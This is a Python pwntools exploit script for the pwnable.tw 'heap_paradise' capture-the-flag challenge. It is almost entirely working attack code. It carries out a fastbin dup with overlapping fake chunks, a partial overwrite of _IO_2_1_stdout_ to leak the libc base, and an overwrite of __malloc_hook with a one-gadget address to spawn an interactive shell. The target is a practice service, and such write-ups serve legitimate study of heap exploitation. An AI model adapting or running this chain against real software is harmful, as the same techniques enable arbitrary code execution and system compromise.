from pwn import *

e = ELF("./heap_paradise")
libc = ELF("./libc_64.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10308)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

nums = 0
def alloc(size=0x68, payload="AAAA"):
  global nums

  p.sendline("1")
  p.sendlineafter(":", str(size))
  p.sendafter(":", payload)
  p.recvuntil(":")

  nums += 1
  return nums - 1

def free(idx):
  p.sendline("2")
  p.sendlineafter(":", str(idx))
  p.recvuntil(":")

p.recvuntil(":")

"""
<Heap Layout>

[A]    [B]    [C]    [D]
[0x70] [0x70] [0x80] [0x50]

After manipulation, we extend [C] by 0x30 and create a fake chunk, [H] in [B]  to get the following setup

[A]    [B]  [H] [C]    [D]
[0x70] [ 0x70 ] [0xb0] [0x20]

"""
A = alloc(0x68)
B = alloc(0x68)
C = alloc(0x78, payload="A" * 0x58 + p64(0x21))
D = alloc(0x48, "A" * 0x28 + p64(0x21)) 

"""
Fastbin dup to fake chunk in B
"""
free(A)
free(B)
free(A)

alloc(0x68, payload="\xd0") # A

"""
Create fake chunk [H] in B just before C
"""
B = alloc(0x68, payload="A" * 0x58 + p64(0x71)) # B
alloc(0x68) # A

"""
Overwrite size header of chunk C + free
"""
H = alloc(0x68, payload="A" * 0x8 + p64(0xb1))
free(C)

"""
Usually libc addresses start with 0x7f. We need this to perform fastbin dup so we manually set them. 
"""
# gdb.attach(p, "set *0x1555553295e5=0x7f \n set *0x155555328af5=0x7f")

"""
Fastbins: B -> H -> A

Recall that [H] is in [B], so we can partial overwrite the fd pointer to point to [C]. 
We then malloc over the size + libc address in [C] to point above _IO_2_1_stdout_
"""
free(A)
free(H)
free(B)

# Partial overwrite fd pointer
alloc(0x68, payload="A" * 0x58 + p64(0x71) + "\xe0")

# Partial overwrite libc address
alloc(0x68, "A" * 0x8 + p64(0x71) + "\xdd\x95") # 4 bit brute force here

print("We got here")
alloc(0x68)

"""
Overwrite stdout with some stuff copied from https://vigneshsrao.github.io/babytcache/
"""
p.sendline("1")
p.sendlineafter(":", str(0x68))
p.sendafter(":", "\x00" * 0x33 + p64(0xfbad1800) + p64(0) + p64(0) + p64(0) + "\x00")


p.recv(0x48)
libc_base = u64(p.recv(8)) - 0x00007f2b504096a3 + 0x00007f2b50045000 
print("{:#x}".format(libc_base))

p.recvuntil("Choice:")

"""
Use the observation that [H] is in [B] to save an alloc for fastbin dup. 
"""
free(H)
free(B)

alloc(0x68, "A" * 0x58 + p64(0x71) + p64(libc_base + libc.symbols["__malloc_hook"] - 0x23))
alloc(0x68)

"""
Overwrite malloc hook with win pointer. 
"""
alloc(0x68, "\x00" * 0x13 + p64(libc_base + 0xef6c4))

p.sendline("1")
p.sendlineafter(":", "1")

p.interactive()
